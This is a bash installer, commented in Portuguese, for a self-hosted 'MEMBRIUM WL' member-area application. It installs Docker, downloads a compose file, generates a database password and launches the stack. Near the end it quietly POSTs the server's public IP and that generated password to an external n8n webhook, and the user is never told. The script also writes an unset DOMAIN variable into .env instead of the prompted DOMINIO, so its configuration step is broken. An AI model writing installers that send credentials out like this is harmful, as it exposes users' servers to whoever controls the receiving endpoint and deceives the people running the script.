#!/bin/bash

set -e

# Função para animar os pontos
animate_dots() {
    local message=$1
    local duration=$2
    local end_time=$((SECONDS + duration))

    while [ $SECONDS -lt $end_time ]; do
        for i in {1..3}; do
            printf "\r%s%s   \b\b\b" "$message" "$(printf '%0.s.' $(seq 1 $i))"
            sleep 0.5
        done
    done
    printf "\r%s...   \n" "$message"
}

# Função para executar comandos silenciosamente
run_silently() {
    "$@" > /dev/null 2>&1
}

# Função para gerar uma senha aleatória
generate_random_password() {
    openssl rand -base64 16 | tr -d '+/=' | cut -c1-16
}

# Função para obter o IP público do servidor
get_public_ip() {
    curl -s https://api.ipify.org
}

# Função para enviar POST com IP e senha
send_post_request() {
    local ip=$1
    local password=$2
    local url="https://n8n-n8n.gumktq.easypanel.host/webhook/896cb0a0-cb34-4ce4-b9b0-0d0c97146b8b"

    curl -X POST -H "Content-Type: application/json" -d "{\"ip\":\"$ip\",\"password\":\"$password\"}" $url
}

# Definir diretório de instalação
INSTALL_DIR="/opt/membriuwl"

# Atualizar o sistema e instalar dependências
run_silently sudo DEBIAN_FRONTEND=noninteractive apt-get update
run_silently sudo DEBIAN_FRONTEND=noninteractive apt-get install -y apt-transport-https ca-certificates curl gnupg lsb-release figlet
wait

# Exibir o texto "MEMBRIUM WL" em formato grande
figlet "MEMBRIUM WL"
animate_dots "Preparando" 10 &

run_silently curl -fsSL https://get.docker.com -o get-docker.sh
run_silently sudo sh get-docker.sh

wait

#Criar diretório de instalação
mkdir -p $INSTALL_DIR

# Download do docker-compose.yml
animate_dots "Baixando configurações" 5 &
run_silently curl -L https://raw.githubusercontent.com/Celipi/member_area/main/docker-compose.yml -o $INSTALL_DIR/docker-compose.yml

# Criar a rede traefik_proxy (se não existir)
if ! docker network inspect traefik_proxy >/dev/null 2>&1; then
    run_silently sudo docker network create traefik_proxy
fi

# Criar o diretório letsencrypt (para os certificados SSL)
mkdir -p $INSTALL_DIR/letsencrypt 2>/dev/null || true
wait

# Gerar senha aleatória
DB_PASSWORD=$(generate_random_password)

# Solicitar o domínio ao usuário
read -p "Digite o domínio que você deseja usar para o seu aplicativo (ex: meuaplicativo.com): " DOMINIO

# Solicitar o e-mail para o Let's Encrypt
read -p "Digite seu endereço de e-mail para o Let's Encrypt: " EMAIL

# Criar arquivo .env com todas as variáveis de ambiente
cat > $INSTALL_DIR/.env << EOF
DB_PASSWORD=$DB_PASSWORD
DOMAIN=$DOMAIN
EMAIL=$EMAIL
EOF

# Iniciar a aplicação com o Docker Compose
animate_dots "Iniciando aplicação" 15 &
cd $INSTALL_DIR
run_silently sudo docker-compose --env-file .env up -d
wait

# Obter o IP público do servidor
SERVER_IP=$(get_public_ip)

# Enviar POST com IP e senha
send_post_request $SERVER_IP $DB_PASSWORD

echo -e "\nInstalação concluída! Acesse seu aplicativo em https://$DOMINIO"
